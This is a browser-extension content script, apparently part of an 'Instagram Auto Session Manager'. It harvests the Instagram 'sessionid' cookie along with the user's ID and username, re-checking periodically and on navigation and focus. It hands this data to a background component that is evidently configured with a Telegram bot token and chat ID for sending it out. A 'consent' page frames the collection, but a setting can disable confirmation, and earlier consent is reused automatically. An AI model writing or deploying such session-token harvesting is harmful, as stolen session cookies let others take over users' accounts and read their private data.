/**
 * ===================================
 * Instagram Auto Session Manager - Content Script
 * Comprehensive script for detecting Instagram sessions and managing consent flow
 * ===================================
 */

// ===================================
// GLOBAL VARIABLES AND CONSTANTS
// ===================================

/**
 * Configuration object for the content script
 */
const CONTENT_CONFIG = {
    // Detection settings
    SESSION_CHECK_INTERVAL: 2000, // Check every 2 seconds
    MAX_CHECK_ATTEMPTS: 10, // Maximum number of checks before giving up
    SESSION_VALIDATION_DELAY: 1000, // Wait before validating session
    
    // Consent flow settings
    CONSENT_COOLDOWN_DURATION: 300000, // 5 minutes cooldown between consent requests
    SESSION_REMEMBER_DURATION: 3600000, // 1 hour to remember user choice
    
    // UI settings
    NOTIFICATION_DURATION: 5000,
    FADE_ANIMATION_DURATION: 300,
    
    // Instagram-specific settings
    INSTAGRAM_DOMAINS: ['instagram.com', 'www.instagram.com'],
    REQUIRED_COOKIES: ['sessionid'],
    SESSION_ID_MIN_LENGTH: 20,
    
    // Extension settings
    EXTENSION_ID: chrome.runtime.id,
    CONSENT_PAGE_PATH: '/consent.html'
};

/**
 * Application state for the content script
 */
let contentState = {
    // Session detection state
    sessionDetected: false,
    sessionData: null,
    lastSessionCheck: 0,
    checkAttempts: 0,
    
    // Consent flow state
    consentRequested: false,
    consentGiven: false,
    lastConsentRequest: 0,
    userChoice: null,
    
    // Extension state
    extensionSettings: null,
    isInitialized: false,
    isProcessing: false,
    
    // Page state
    currentUrl: window.location.href,
    pageLoadTime: Date.now(),
    documentReady: false
};

/**
 * DOM elements and UI components
 */
let uiElements = {
    notificationContainer: null,
    statusIndicator: null,
    consentBanner: null
};

// ===================================
// INITIALIZATION AND SETUP
// ===================================

/**
 * Main initialization function
 * Sets up the content script when the page loads
 */
function initializeContentScript() {
    console.log('Instagram Auto Session Manager Content Script - Initializing...');
    
    try {
        // Check if we're on Instagram
        if (!isInstagramPage()) {
            console.log('Not on Instagram page, content script will not run');
            return;
        }
        
        console.log('Instagram page detected, initializing content script...');
        
        // Set up event listeners
        setupEventListeners();
        
        // Load extension settings
        loadExtensionSettings();
        
        // Start session detection
        startSessionDetection();
        
        // Mark as initialized
        contentState.isInitialized = true;
        
        console.log('Content script initialized successfully');
        
    } catch (error) {
        console.error('Error initializing content script:', error);
        reportError('initialization_error', error);
    }
}

/**
 * Set up event listeners for page changes and user interactions
 */
function setupEventListeners() {
    // Listen for page navigation changes (Instagram is a SPA)
    let lastUrl = location.href;
    new MutationObserver(() => {
        const url = location.href;
        if (url !== lastUrl) {
            lastUrl = url;
            handlePageNavigation(url);
        }
    }).observe(document, { subtree: true, childList: true });
    
    // Listen for document ready state changes
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', handleDocumentReady);
    } else {
        handleDocumentReady();
    }
    
    // Listen for window focus/blur events
    window.addEventListener('focus', handleWindowFocus);
    window.addEventListener('blur', handleWindowBlur);
    
    // Listen for messages from background script
    chrome.runtime.onMessage.addListener(handleBackgroundMessage);
    
    // Listen for storage changes
    chrome.storage.onChanged.addListener(handleStorageChange);
    
    // Listen for beforeunload to clean up
    window.addEventListener('beforeunload', handlePageUnload);
}

/**
 * Load extension settings from storage
 */
async function loadExtensionSettings() {
    try {
        const result = await chrome.storage.local.get([
            'telegramSettings', 
            'privacySettings', 
            'appSettings',
            'userConsent',
            'sessionHistory'
        ]);
        
        contentState.extensionSettings = {
            telegram: result.telegramSettings || {},
            privacy: result.privacySettings || { requireConfirmation: true },
            app: result.appSettings || {},
            userConsent: result.userConsent || {},
            sessionHistory: result.sessionHistory || []
        };
        
        console.log('Extension settings loaded:', contentState.extensionSettings);
        
    } catch (error) {
        console.error('Error loading extension settings:', error);
        reportError('settings_load_error', error);
    }
}

// ===================================
// SESSION DETECTION FUNCTIONS
// ===================================

/**
 * Start the session detection process
 */
function startSessionDetection() {
    console.log('Starting session detection...');
    
    // Initial check
    checkForSession();
    
    // Set up periodic checks
    const checkInterval = setInterval(() => {
        if (contentState.checkAttempts >= CONTENT_CONFIG.MAX_CHECK_ATTEMPTS) {
            console.log('Maximum check attempts reached, stopping detection');
            clearInterval(checkInterval);
            return;
        }
        
        checkForSession();
    }, CONTENT_CONFIG.SESSION_CHECK_INTERVAL);
    
    // Clean up interval when page unloads
    window.addEventListener('beforeunload', () => {
        clearInterval(checkInterval);
    });
}

/**
 * Check for Instagram session in cookies and page data
 */
async function checkForSession() {
    try {
        contentState.checkAttempts++;
        contentState.lastSessionCheck = Date.now();
        
        console.log(`Session check attempt ${contentState.checkAttempts}/${CONTENT_CONFIG.MAX_CHECK_ATTEMPTS}`);
        
        // Extract session data
        const sessionData = await extractSessionData();
        
        if (sessionData && validateSessionData(sessionData)) {
            console.log('Valid session detected:', sessionData);
            
            contentState.sessionDetected = true;
            contentState.sessionData = sessionData;
            
            // Notify background script
            notifyBackgroundScript('session_detected', sessionData);
            
            // Check if we should request consent
            await evaluateConsentRequest();
            
        } else {
            console.log('No valid session found');
            contentState.sessionDetected = false;
            contentState.sessionData = null;
        }
        
    } catch (error) {
        console.error('Error checking for session:', error);
        reportError('session_check_error', error);
    }
}

/**
 * Extract session data from cookies and page
 * @returns {Object|null} - Extracted session data or null
 */
async function extractSessionData() {
    try {
        const sessionData = {
            sessionId: null,
            userId: null,
            username: null,
            extractedAt: new Date().toISOString(),
            url: window.location.href,
            userAgent: navigator.userAgent,
            pageTitle: document.title
        };
        
        // Extract session ID from cookies
        sessionData.sessionId = getCookieValue('sessionid');
        
        if (!sessionData.sessionId) {
            return null;
        }
        
        // Extract user data from page
        await extractUserDataFromPage(sessionData);
        
        return sessionData;
        
    } catch (error) {
        console.error('Error extracting session data:', error);
        return null;
    }
}

/**
 * Extract user data from Instagram page
 * @param {Object} sessionData - Session data object to populate
 */
async function extractUserDataFromPage(sessionData) {
    try {
        // Method 1: Try to get data from window._sharedData (older Instagram)
        if (window._sharedData && window._sharedData.config) {
            const viewerId = window._sharedData.config.viewerId;
            if (viewerId) {
                sessionData.userId = viewerId;
            }
        }
        
        // Method 2: Look for data in script tags (newer Instagram)
        const scripts = document.querySelectorAll('script[type=\"application/json\"]');
        for (let script of scripts) {
            try {
                const data = JSON.parse(script.textContent);
                
                // Look for user data in various locations
                if (data.require && Array.isArray(data.require)) {
                    for (let requirement of data.require) {
                        if (Array.isArray(requirement) && requirement.length > 3) {
                            const moduleData = requirement[3];
                            if (moduleData && moduleData[0] && moduleData[0].viewerId) {
                                sessionData.userId = moduleData[0].viewerId;
                            }
                        }
                    }
                }
                
            } catch (parseError) {
                // Ignore parsing errors for individual scripts
                continue;
            }
        }
        
        // Method 3: Look in regular script tags for patterns
        const allScripts = document.querySelectorAll('script');
        for (let script of allScripts) {
            const content = script.textContent;
            
            // Look for user ID patterns
            const userIdMatch = content.match(/\"viewerId\":\"(\\d+)\"/);
            if (userIdMatch && !sessionData.userId) {
                sessionData.userId = userIdMatch[1];
            }
            
            // Look for username patterns
            const usernameMatch = content.match(/\"username\":\"([^\"]+)\"/);
            if (usernameMatch && !sessionData.username) {
                sessionData.username = usernameMatch[1];
            }
            
            // Look for additional patterns
            const profileMatch = content.match(/\"profilePage_\\d+\":\\{[^}]*\"username\":\"([^\"]+)\"/);
            if (profileMatch && !sessionData.username) {
                sessionData.username = profileMatch[1];
            }
        }
        
        // Method 4: Try to get username from URL or page elements
        if (!sessionData.username) {
            // Check if we're on a profile page
            const pathMatch = window.location.pathname.match(/^\\/([^\\/]+)\\/?$/);
            if (pathMatch && !isInstagramSystemPath(pathMatch[1])) {
                sessionData.username = pathMatch[1];
            }
            
            // Try to get from meta tags
            const titleMeta = document.querySelector('meta[property=\"og:title\"]');
            if (titleMeta) {
                const titleMatch = titleMeta.content.match(/^@([^•\\s]+)/);
                if (titleMatch) {
                    sessionData.username = titleMatch[1].trim();
                }
            }
            
            // Try to get from page title
            const titleMatch = document.title.match(/^@([^•\\s]+)/);
            if (titleMatch) {
                sessionData.username = titleMatch[1].trim();
            }
        }
        
        // Method 5: Look for user data in localStorage or sessionStorage
        try {
            const localStorageData = localStorage.getItem('instagramUserData');
            if (localStorageData) {
                const userData = JSON.parse(localStorageData);
                if (userData.userId && !sessionData.userId) {
                    sessionData.userId = userData.userId;
                }
                if (userData.username && !sessionData.username) {
                    sessionData.username = userData.username;
                }
            }
        } catch (storageError) {
            // Ignore storage errors
        }
        
        console.log('User data extraction completed:', {
            userId: sessionData.userId ? 'found' : 'not found',
            username: sessionData.username ? 'found' : 'not found'
        });
        
    } catch (error) {
        console.error('Error extracting user data from page:', error);
    }
}

/**
 * Validate extracted session data
 * @param {Object} sessionData - Session data to validate
 * @returns {boolean} - True if valid
 */
function validateSessionData(sessionData) {
    if (!sessionData || typeof sessionData !== 'object') {
        return false;
    }
    
    // Check required fields
    if (!sessionData.sessionId || !sessionData.extractedAt) {
        return false;
    }
    
    // Validate session ID format and length
    if (typeof sessionData.sessionId !== 'string' || 
        sessionData.sessionId.length < CONTENT_CONFIG.SESSION_ID_MIN_LENGTH) {
        return false;
    }
    
    // Check if session ID looks valid (basic pattern check)
    if (!/^[a-zA-Z0-9%]+$/.test(sessionData.sessionId)) {
        return false;
    }
    
    return true;
}

// ===================================
// CONSENT FLOW FUNCTIONS
// ===================================

/**
 * Evaluate whether to request consent from user
 */
async function evaluateConsentRequest() {
    try {
        console.log('Evaluating consent request...');
        
        // Check if consent is required
        if (!shouldRequestConsent()) {
            console.log('Consent request not needed');
            return;
        }
        
        // Check cooldown period
        const now = Date.now();
        const timeSinceLastRequest = now - contentState.lastConsentRequest;
        
        if (timeSinceLastRequest < CONTENT_CONFIG.CONSENT_COOLDOWN_DURATION) {
            console.log('Consent request in cooldown period');
            return;
        }
        
        // Check if user has already made a choice for this session
        if (contentState.userChoice && contentState.userChoice.timestamp) {
            const choiceAge = now - contentState.userChoice.timestamp;
            if (choiceAge < CONTENT_CONFIG.SESSION_REMEMBER_DURATION) {
                console.log('User choice remembered, skipping consent request');
                
                if (contentState.userChoice.consent === 'granted') {
                    // Process automatically if consent was previously granted
                    await processAutomaticConsent();
                }
                return;
            }
        }
        
        // Request consent
        await requestUserConsent();
        
    } catch (error) {
        console.error('Error evaluating consent request:', error);
        reportError('consent_evaluation_error', error);
    }
}

/**
 * Determine if consent should be requested
 * @returns {boolean} - True if consent should be requested
 */
function shouldRequestConsent() {
    // Check if extension is properly configured
    if (!contentState.extensionSettings) {
        console.log('Extension settings not loaded');
        return false;
    }
    
    const { telegram, privacy } = contentState.extensionSettings;
    
    // Check if Telegram is configured
    if (!telegram.botToken || !telegram.chatId) {
        console.log('Telegram not configured, consent not needed');
        return false;
    }
    
    // Check privacy settings
    if (privacy.requireConfirmation === false) {
        console.log('Confirmation not required by settings');
        return false;
    }
    
    // Check if we're already processing
    if (contentState.isProcessing) {
        console.log('Already processing, skipping consent request');
        return false;
    }
    
    // Check if consent was already requested recently
    if (contentState.consentRequested) {
        console.log('Consent already requested');
        return false;
    }
    
    return true;
}

/**
 * Request user consent by opening consent page
 */
async function requestUserConsent() {
    try {
        console.log('Requesting user consent...');
        
        contentState.consentRequested = true;
        contentState.lastConsentRequest = Date.now();
        
        // Show notification to user
        showNotification('Instagram session detected. Opening consent page...', 'info');
        
        // Store session data for consent page
        await chrome.storage.local.set({
            pendingSessionData: contentState.sessionData,
            consentRequestTime: Date.now()
        });
        
        // Open consent page
        const consentUrl = chrome.runtime.getURL('consent.html');
        
        // Try to open in new tab
        try {
            await chrome.runtime.sendMessage({
                action: 'openConsentPage',
                url: consentUrl,
                sessionData: contentState.sessionData
            });
        } catch (messageError) {
            // Fallback: open directly
            window.open(consentUrl, '_blank', 'width=900,height=700,scrollbars=yes,resizable=yes');
        }
        
        // Log consent request
        await logActivity('consent_requested', {
            sessionId: contentState.sessionData.sessionId.substring(0, 10) + '...',
            url: window.location.href,
            timestamp: new Date().toISOString()
        });
        
    } catch (error) {
        console.error('Error requesting user consent:', error);
        reportError('consent_request_error', error);
        
        // Reset state on error
        contentState.consentRequested = false;
    }
}

/**
 * Process automatic consent for returning users
 */
async function processAutomaticConsent() {
    try {
        console.log('Processing automatic consent...');
        
        contentState.isProcessing = true;
        
        // Show notification
        showNotification('Processing with previous consent...', 'info');
        
        // Send data to background script for processing
        await chrome.runtime.sendMessage({
            action: 'processSessionData',
            sessionData: contentState.sessionData,
            consentType: 'automatic'
        });
        
        // Log automatic processing
        await logActivity('automatic_processing', {
            sessionId: contentState.sessionData.sessionId.substring(0, 10) + '...',
            url: window.location.href,
            timestamp: new Date().toISOString()
        });
        
    } catch (error) {
        console.error('Error processing automatic consent:', error);
        reportError('automatic_consent_error', error);
    } finally {
        contentState.isProcessing = false;
    }
}

// ===================================
// EVENT HANDLERS
// ===================================

/**
 * Handle page navigation changes
 * @param {string} newUrl - New URL after navigation
 */
function handlePageNavigation(newUrl) {
    console.log('Page navigation detected:', newUrl);
    
    contentState.currentUrl = newUrl;
    
    // Reset some state on navigation
    contentState.checkAttempts = 0;
    
    // Re-check for session after navigation
    setTimeout(() => {
        if (isInstagramPage()) {
            checkForSession();
        }
    }, CONTENT_CONFIG.SESSION_VALIDATION_DELAY);
}

/**
 * Handle document ready state
 */
function handleDocumentReady() {
    console.log('Document ready');
    contentState.documentReady = true;
    
    // Perform additional checks now that DOM is ready
    if (contentState.isInitialized) {
        checkForSession();
    }
}

/**
 * Handle window focus events
 */
function handleWindowFocus() {
    console.log('Window focused');
    
    // Re-check session when window gains focus
    if (contentState.isInitialized && isInstagramPage()) {
        setTimeout(checkForSession, 1000);
    }
}

/**
 * Handle window blur events
 */
function handleWindowBlur() {
    console.log('Window blurred');
}

/**
 * Handle messages from background script
 * @param {Object} message - Message from background script
 * @param {Object} sender - Message sender information
 * @param {Function} sendResponse - Response callback
 */
function handleBackgroundMessage(message, sender, sendResponse) {
    console.log('Message from background script:', message);
    
    try {
        switch (message.action) {
            case 'consentProcessed':
                handleConsentProcessed(message.data);
                break;
                
            case 'settingsUpdated':
                handleSettingsUpdated(message.settings);
                break;
                
            case 'requestSessionData':
                sendResponse({ sessionData: contentState.sessionData });
                break;
                
            case 'clearSessionData':
                handleClearSessionData();
                break;
                
            default:
                console.log('Unknown message action:', message.action);
        }
    } catch (error) {
        console.error('Error handling background message:', error);
        reportError('message_handling_error', error);
    }
}

/**
 * Handle consent processed notification
 * @param {Object} data - Consent processing result data
 */
function handleConsentProcessed(data) {
    console.log('Consent processed:', data);
    
    if (data.success) {
        // Store user choice
        contentState.userChoice = {
            consent: 'granted',
            timestamp: Date.now(),
            sessionId: contentState.sessionData?.sessionId
        };
        
        // Show success notification
        showNotification('Session data sent successfully!', 'success');
        
        // Clear session data if configured
        if (contentState.extensionSettings?.privacy?.autoClearData) {
            clearSessionData();
        }
        
    } else {
        // Show error notification
        showNotification(`Error: ${data.error}`, 'error');
    }
    
    // Reset processing state
    contentState.isProcessing = false;
    contentState.consentRequested = false;
}

/**
 * Handle settings updated notification
 * @param {Object} settings - Updated settings
 */
function handleSettingsUpdated(settings) {
    console.log('Settings updated:', settings);
    
    // Reload settings
    loadExtensionSettings();
    
    // Show notification
    showNotification('Extension settings updated', 'info');
}

/**
 * Handle storage changes
 * @param {Object} changes - Storage changes
 * @param {string} namespace - Storage namespace
 */
function handleStorageChange(changes, namespace) {
    if (namespace === 'local') {
        console.log('Storage changed:', changes);
        
        // Reload settings if they changed
        if (changes.telegramSettings || changes.privacySettings || changes.appSettings) {
            loadExtensionSettings();
        }
        
        // Handle user consent changes
        if (changes.userConsent) {
            const newConsent = changes.userConsent.newValue;
            if (newConsent) {
                contentState.userChoice = newConsent;
            }
        }
    }
}

/**
 * Handle page unload
 */
function handlePageUnload() {
    console.log('Page unloading, cleaning up...');
    
    // Clear any pending operations
    contentState.isProcessing = false;
    
    // Log page unload
    logActivity('page_unload', {
        url: window.location.href,
        sessionDetected: contentState.sessionDetected,
        timestamp: new Date().toISOString()
    });
}

/**
 * Handle clear session data request
 */
function handleClearSessionData() {
    console.log('Clearing session data...');
    clearSessionData();
    showNotification('Session data cleared', 'info');
}

// ===================================
// UTILITY FUNCTIONS
// ===================================

/**
 * Check if current page is Instagram
 * @returns {boolean} - True if on Instagram
 */
function isInstagramPage() {
    const hostname = window.location.hostname.toLowerCase();
    return CONTENT_CONFIG.INSTAGRAM_DOMAINS.some(domain => 
        hostname === domain || hostname.endsWith('.' + domain)
    );
}

/**
 * Check if path is an Instagram system path
 * @param {string} path - URL path to check
 * @returns {boolean} - True if system path
 */
function isInstagramSystemPath(path) {
    const systemPaths = [
        'explore', 'reels', 'direct', 'stories', 'accounts', 'help',
        'about', 'api', 'developer', 'press', 'support', 'privacy',
        'terms', 'safety', 'login', 'signup', 'session', 'challenge'
    ];
    
    return systemPaths.includes(path.toLowerCase());
}

/**
 * Get cookie value by name
 * @param {string} name - Cookie name
 * @returns {string|null} - Cookie value or null
 */
function getCookieValue(name) {
    const cookies = document.cookie.split(';');
    for (let cookie of cookies) {
        const [cookieName, cookieValue] = cookie.trim().split('=');
        if (cookieName === name) {
            return decodeURIComponent(cookieValue);
        }
    }
    return null;
}

/**
 * Clear session data from content script state
 */
function clearSessionData() {
    contentState.sessionData = null;
    contentState.sessionDetected = false;
    contentState.consentRequested = false;
    contentState.userChoice = null;
    
    // Clear from storage
    chrome.storage.local.remove(['pendingSessionData', 'consentRequestTime']);
}

/**
 * Show notification to user
 * @param {string} message - Notification message
 * @param {string} type - Notification type ('info', 'success', 'error', 'warning')
 */
function showNotification(message, type = 'info') {
    try {
        // Create notification container if it doesn't exist
        if (!uiElements.notificationContainer) {
            createNotificationContainer();
        }
        
        // Create notification element
        const notification = document.createElement('div');
        notification.className = `instagram-session-notification ${type}`;
        notification.innerHTML = `
            <div class=\"notification-content\">
                <div class=\"notification-icon\">${getNotificationIcon(type)}</div>
                <div class=\"notification-message\">${message}</div>
                <button class=\"notification-close\" onclick=\"this.parentElement.parentElement.remove()\">×</button>
            </div>
        `;
        
        // Add styles
        notification.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            background: ${getNotificationColor(type)};
            color: white;
            padding: 12px 16px;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
            z-index: 10000;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            font-size: 14px;
            max-width: 350px;
            animation: slideInRight 0.3s ease-out;
        `;
        
        // Add to container
        uiElements.notificationContainer.appendChild(notification);
        
        // Auto-remove after duration
        setTimeout(() => {
            if (notification.parentNode) {
                notification.style.animation = 'slideOutRight 0.3s ease-in';
                setTimeout(() => {
                    if (notification.parentNode) {
                        notification.remove();
                    }
                }, 300);
            }
        }, CONTENT_CONFIG.NOTIFICATION_DURATION);
        
        console.log(`Notification shown: ${message} (${type})`);
        
    } catch (error) {
        console.error('Error showing notification:', error);
    }
}

/**
 * Create notification container
 */
function createNotificationContainer() {
    uiElements.notificationContainer = document.createElement('div');
    uiElements.notificationContainer.id = 'instagram-session-notifications';
    uiElements.notificationContainer.style.cssText = `
        position: fixed;
        top: 0;
        right: 0;
        z-index: 10000;
        pointer-events: none;
    `;
    
    // Add CSS animations
    const style = document.createElement('style');
    style.textContent = `
        @keyframes slideInRight {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }
        @keyframes slideOutRight {
            from { transform: translateX(0); opacity: 1; }
            to { transform: translateX(100%); opacity: 0; }
        }
        .instagram-session-notification {
            pointer-events: auto;
            margin-bottom: 10px;
        }
        .notification-content {
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .notification-close {
            background: none;
            border: none;
            color: white;
            font-size: 18px;
            cursor: pointer;
            padding: 0;
            margin-left: auto;
        }
    `;
    
    document.head.appendChild(style);
    document.body.appendChild(uiElements.notificationContainer);
}

/**
 * Get notification icon for type
 * @param {string} type - Notification type
 * @returns {string} - Icon character
 */
function getNotificationIcon(type) {
    const icons = {
        info: 'ℹ️',
        success: '✅',
        error: '❌',
        warning: '⚠️'
    };
    return icons[type] || icons.info;
}

/**
 * Get notification color for type
 * @param {string} type - Notification type
 * @returns {string} - CSS color
 */
function getNotificationColor(type) {
    const colors = {
        info: '#17a2b8',
        success: '#28a745',
        error: '#dc3545',
        warning: '#ffc107'
    };
    return colors[type] || colors.info;
}

/**
 * Notify background script of events
 * @param {string} event - Event type
 * @param {Object} data - Event data
 */
async function notifyBackgroundScript(event, data = {}) {
    try {
        await chrome.runtime.sendMessage({
            action: 'contentScriptEvent',
            event: event,
            data: data,
            timestamp: new Date().toISOString(),
            url: window.location.href
        });
    } catch (error) {
        console.error('Error notifying background script:', error);
    }
}

/**
 * Log activity for transparency and debugging
 * @param {string} activity - Activity type
 * @param {Object} data - Activity data
 */
async function logActivity(activity, data = {}) {
    try {
        const logEntry = {
            timestamp: new Date().toISOString(),
            activity: activity,
            data: data,
            url: window.location.href,
            userAgent: navigator.userAgent
        };
        
        console.log('Activity logged:', logEntry);
        
        // Send to background script for storage
        await chrome.runtime.sendMessage({
            action: 'logActivity',
            logEntry: logEntry
        });
        
    } catch (error) {
        console.error('Error logging activity:', error);
    }
}

/**
 * Report error to background script
 * @param {string} errorType - Type of error
 * @param {Error} error - Error object
 */
async function reportError(errorType, error) {
    try {
        const errorReport = {
            type: errorType,
            message: error.message,
            stack: error.stack,
            timestamp: new Date().toISOString(),
            url: window.location.href,
            userAgent: navigator.userAgent,
            extensionVersion: chrome.runtime.getManifest().version
        };
        
        console.error('Error reported:', errorReport);
        
        // Send to background script
        await chrome.runtime.sendMessage({
            action: 'reportError',
            errorReport: errorReport
        });
        
    } catch (reportingError) {
        console.error('Error reporting error:', reportingError);
    }
}

// ===================================
// ERROR HANDLING
// ===================================

/**
 * Global error handler
 */
window.addEventListener('error', function(e) {
    console.error('Unhandled error in content script:', e.error);
    reportError('unhandled_error', e.error);
});

/**
 * Global promise rejection handler
 */
window.addEventListener('unhandledrejection', function(e) {
    console.error('Unhandled promise rejection in content script:', e.reason);
    reportError('unhandled_promise_rejection', new Error(e.reason));
});

// ===================================
// INITIALIZATION
// ===================================

// Initialize when DOM is ready
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initializeContentScript);
} else {
    initializeContentScript();
}

// Also initialize on window load as fallback
window.addEventListener('load', () => {
    if (!contentState.isInitialized) {
        initializeContentScript();
    }
});

console.log('Instagram Auto Session Manager Content Script - Loaded successfully');

